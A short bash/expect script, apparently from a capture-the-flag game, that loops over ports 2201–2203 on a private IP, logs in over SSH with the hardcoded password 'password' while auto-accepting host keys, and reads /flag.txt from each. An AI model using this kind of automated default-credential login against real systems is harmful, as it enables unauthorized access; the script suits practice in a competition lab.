#!/bin/bash
for i in `seq 2201 2203`
do
/usr/bin/expect<<-EOF
spawn ssh 192.168.59.75 -p$i "cat /flag.txt"
	expect {
        	"yes/no" { send "yes\n";exp_continue }
        	"password" { send "password\n"}

 
}
expect eof
EOF
done


